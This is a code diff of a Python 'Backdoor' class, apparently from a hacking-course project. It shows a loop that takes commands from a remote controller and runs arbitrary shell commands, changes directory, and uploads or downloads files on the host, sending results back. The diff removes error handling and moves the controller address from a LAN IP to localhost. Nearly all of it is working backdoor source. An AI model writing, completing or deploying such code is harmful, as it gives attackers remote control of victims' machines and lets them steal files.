@@ -49,30 +49,27 @@ class Backdoor:
 
     def run(self):
         while True:
-            try:
-                command = str(self.reliable_recive())
-                if command.split()[0] == "exit":
-                    self.connection.close()
-                    exit()
-                elif command.split()[0] == "cd" and len(command) >= 2:
-                    command_result = self.change_working_directory_to(command.split()[1])
-                elif command.split()[0] == "download":
-                    command_result = self.read_file(command.split()[1])
-                elif command.split()[0] == "upload":
-                    file = ""
-                    list_for_file = command.split()
-                    for t in range (2, len(list_for_file)):
-                        file += list_for_file[t]
-                    command_result = self.write_file(command.split()[1], file)
-                else:
-                    command_result = self.execute_system_command(command)          
-                
-                self.reliable_send(command_result)
-            except:
-                self.reliable_send("[-] Error during execution the command")
+            command = str(self.reliable_recive())
+            if command.split()[0] == "exit":
+                self.connection.close()
+                exit()
+            elif command.split()[0] == "cd" and len(command) >= 2:
+                command_result = self.change_working_directory_to(command.split()[1])
+            elif command.split()[0] == "download":
+                command_result = self.read_file(command.split()[1])
+            elif command.split()[0] == "upload":
+                file = ""
+                list_for_file = command.split()
+                for t in range (2, len(list_for_file) - 1):
+                    file += list_for_file[t]
+                command_result = self.write_file(command.split()[1], file)
+            else:
+                command_result = self.execute_system_command(command)                          
+            
+            self.reliable_send(command_result)
 
 
-my_backdoor = Backdoor("192.168.0.103", 4444)
+my_backdoor = Backdoor("localhost", 4444)
 my_backdoor.run()
 
 
